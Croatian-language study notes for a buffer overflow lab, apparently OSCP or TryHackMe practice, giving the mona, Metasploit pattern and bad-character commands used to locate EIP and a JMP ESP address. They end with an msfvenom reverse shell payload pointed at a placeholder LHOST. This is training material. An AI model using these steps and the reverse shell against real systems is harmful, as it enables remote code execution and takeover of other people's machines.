Spajanje na windows stroj:
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea /tls-seclevel:0

Rad u moni:
Folder za rad za buffer overlow (opcionalno)
!mona config -set workingfolder c:\mona\%p

Nakon pokretanja fuzzera, kreiramo neki random redoslijed unikatnih znakova duljine koje je potrebno da crashamo program plus 200-400

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 //ako je fuzzing izbacio sa 2000
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 600

/opt/metasploit-framework/embedded/bin/ruby (putanja da se moze pokretati na THM masini)

To koristimo kada se program crasha da mozemo pronaci na kojoj lokaciji je registar koji nam treba. (stavljamo podatak na payload)
Ako nam EIP registar ima vrijednost 0x12345678 mozemo pronaci na kojoj lokaciji za offset cemo koristiti preko naredbe:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 12345678
Također kada se crasha sa payloadom mozemo pogledati registre preko naredbe:

!mona findmsp -distance 2400 //definiramo 2400 da gleda od 0-2400. //ako zelimo od do koristimo -distance 2400 -start 1000 

Tražimo lokaciju EIP-a.
Kada smo ga nasli stavljamo offset kao udaljenost do EIP i retn nesto random poput CCCC

Iduci korak: izbacivanje losih znakova
Potrebno je raditi jer ovisno o aplikaciji, jeziku sustavu stogod, nekada se neki znakovi tretiraju na poseban nacin i ne ponasaju kako bismo htjeli. Zato ih moramo locirati i izbaciti iz našeg payloada.
Koristimo 

!mona bytearray -b "\x00"

kako bi generirali sve moguce kombinacije bytova (0x00 - 0xFF) i testiramo koji ce nam odgovarati, a koji ne.
U nasoj python skripti stvaramo takav array koristeci naredbu (znamo da 0x00 je null i ne moze pa ga obilazimo)

bit_array="".join(f"\\x{x:02x}" for x in range(1, 256))

i stavljamo ga na poziciju payloada.

Kada pošaljemo payload gledamo ESP registar (extended stack pointer) i tražimo znakove koji remete red. (Primjer 01 02 03 07 05) i onda u kodu za generiranje byte arraya izbacujemo 0x07.

Provjeravamo preko ove naredbe i želimo da registri koji su loši na toj listi budu identični registerima koje smo izbacili:

!mona compare -f C:\mona\oscp\bytearray.bin -a <address esp>

Nakon pronalaska losih znakova, trazimo "jump point" (lokacija na koju mozemo skociti) i ne sadrzi lose znakove.

!mona jmp -r esp -cpb "\x00..."

To stavljamo pod retn varijablu

Nakon sto dobijemo adrese moramo generirati payload u msfvenomu.

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00..." -f c (ovisno o little ili big endian biramo redoslijed kojim cemo pisati adrese)

Nakon generiranja payloda kopiramo ga u lokaciju payload i dodajemo nop u skriptu bufferExploit.py
Prije slanja exploita, moramo otvoriti listener i to je vise manje to zasada.









